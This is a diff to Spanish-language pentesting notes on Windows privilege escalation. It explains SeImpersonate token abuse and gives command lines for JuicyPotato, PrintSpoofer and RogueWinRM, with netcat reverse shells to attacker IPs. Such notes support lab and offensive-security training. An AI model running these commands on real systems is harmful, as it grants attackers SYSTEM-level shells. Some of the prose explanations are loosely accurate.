@@ -1763,15 +1763,86 @@ move .\<BINARY>.exe C:\Ruta\Al\Binario\
 
 ##### SeImpersonate y SeAssignPrimaryToken
 
-###### RogueWinRM.exe
+En Windows, cada proceso tiene asociado un **token** que contiene información sobre la cuenta que lo está ejecutando, como los permisos y privilegios asociados. Sin embargo, estos tokens **no se consideran recursos completamente seguros**, ya que residen en la memoria del sistema y, en teoría, podrían ser vulnerables a ataques de fuerza bruta o manipulación por parte de usuarios malintencionados con acceso limitado. Para utilizar un token y realizar acciones en nombre de otro usuario (por ejemplo, mediante la función `CreateProcessWithTokenW`), se requiere el privilegio **SeImpersonate**. Este privilegio está generalmente reservado para cuentas administrativas y servicios de alto nivel, como los que se ejecutan bajo las cuentas `SYSTEM` o `Local Service`.
+
+Durante el proceso de **endurecimiento del sistema** (hardening), este privilegio puede ser eliminado o restringido como medida de seguridad.
+
+> En Windows, cada proceso tiene un token que contiene información sobre la cuenta que lo está ejecutando. 
+
+Los programas legítimos en Windows pueden utilizar el token de otro proceso para escalar privilegios, pasando de una cuenta de Administrador a Local System, que tiene permisos más amplios y acceso completo al sistema. Esto se logra típicamente mediante una llamada al proceso WinLogon, que es responsable de gestionar los inicios de sesión y los tokens de seguridad. Al interactuar con WinLogon, un proceso puede obtener un token del sistema y luego ejecutarse con ese token, efectivamente operando dentro del contexto de Local System.
+
+Sin embargo, este mecanismo también puede ser explotado por atacantes en técnicas de escalada de privilegios, como los ataques del estilo "Potato". Estos ataques aprovechan el privilegio SeImpersonate, que permite a un proceso suplantar el token de otro usuario. Aunque una cuenta de servicio puede tener el privilegio SeImpersonate, no tiene acceso completo a los privilegios de nivel SYSTEM. El ataque Potato engaña a un proceso que se ejecuta como SYSTEM para que se conecte a un proceso controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token del proceso SYSTEM y utilizarlo para ejecutar código con privilegios elevados.
+
+Varias herramientas y técnicas aprovechan SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege para escalar privilegios a SYSTEM o Administrador. A continuación, se presentan algunas de ellas:
+
+###### JuicyPotato.exe
+
+> *Windows 10 compilación 1809 - Windows Server 2016*
+
+JuicyPotato es una herramienta de explotación diseñada para abusar de los privilegios SeImpersonate o SeAssignPrimaryToken en sistemas Windows. Estos privilegios, comúnmente asignados a cuentas de servicio, permiten a un proceso suplantar tokens de seguridad de otros usuarios. JuicyPotato aprovecha esta capacidad mediante ataques de reflexión DCOM/NTLM, engañando a un proceso que se ejecuta con privilegios de SYSTEM para que se conecte a un servicio controlado por el atacante. Una vez establecida la conexión, el atacante puede robar el token de SYSTEM y utilizarlo para ejecutar código con privilegios elevados.
+
+Sin embargo, esta herramienta tiene limitaciones: funciona en versiones de Windows hasta Windows Server 2016 y Windows 10, compilación 1809.
+
+**Pasos para explotar el uso de JuicyPotato**:
+
+1. **Configurar el listener con Netcat en la máquina atacante**:
+
+```bash
+rlwrap nc -lnvp 4444
+```
+
+2. **Ejecutar JuicyPotato en la máquina objetivo**:
+
+```bash
+c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
+```
+
+Explicación:
+
+- `-l`: Especifica el puerto de escucha del servidor COM (53375 en este caso).
+- `-p`: Programa a lanzar (en este caso, cmd.exe).
+- `-a`: Argumento pasado a cmd.exe. Aquí, le indica a Netcat que se conecte a la máquina del atacante y proporcione una reverse shell.
+- `-t`: Especifica el `createprocess` a llamar, utilizando las funciones `CreateProcessWithTokenW` o `CreateProcessAsUser`, que requieren privilegios **SeImpersonate** o **SeAssignPrimaryToken**.
+
+###### PrintSpoofer
+
+> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*
+
+> https://github.com/itm4n/PrintSpoofer
+
+**PrintSpoofer** abusa del servicio **Spooler** de impresión de Windows y su interacción con named pipes (tuberías con nombre) para escalar privilegios. Explota una combinación de características y comportamientos del sistema operativo que permiten a un atacante suplantar el token de seguridad de un proceso que se ejecuta como SYSTEM.
+
+**Pasos para explotar el código usando PrintSpoofer**:
+
+1. Ejecutar PrintSpoofer:
+
+```powershell
+c:\temp\PrintSpoofer.exe -c "c:\temp\nc.exe 192.168.56.5 4444 -e cmd"
+```
+
+Explicación:
+
+- `-c`: Especifica el comando que se ejecutará una vez que la escalada de privilegios sea exitosa. En este caso, se ejecuta Netcat (nc.exe) para proporcionar una reverse shell a la máquina atacante. 
+
+###### RogueWinRM
+
+> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*
 
 > https://github.com/antonioCoco/RogueWinRM
 
+**RogueWinRM** es una técnica de explotación que permite la escalada de privilegios en sistemas Windows aprovechando el servicio WinRM (Windows Remote Management). A diferencia de JuicyPotato, que se basa en la reflexión DCOM/NTLM, RogueWinRM abusa del servicio WinRM para ejecutar código con privilegios de SYSTEM. Esta técnica es particularmente útil en entornos donde JuicyPotato no funciona, como en Windows Server 2019 y versiones más recientes de Windows 10.
+
+**¿Por qué RogueWinRM es efectivo en versiones más recientes?**
+
+En versiones más recientes de Windows, como Windows Server 2019 y Windows 10 (compilaciones posteriores a 1809), Microsoft implementó parches y medidas de seguridad que mitigaron los ataques basados en DCOM/NTLM (como JuicyPotato). Sin embargo, RogueWinRM sigue siendo efectivo porque explota un vector diferente: el servicio WinRM, que a menudo está habilitado por defecto en servidores para permitir la administración remota.
+
 ```powershell
-RogueWinRM.exe -p C:\windows\temp\nc64.exe -a "192.168.56.5 4000 -e cmd"
+.\RogueWinRM.exe -p "C:\temp\payload.exe"
 ```
 
 ###### SigmaPotato.exe
+
+> *Windows 10 (todas las versiones, incluidas las compilaciones posteriores a 1809) y Windows Server 2012/2016/2019*
 
 > https://github.com/tylerdotrar/SigmaPotato
 
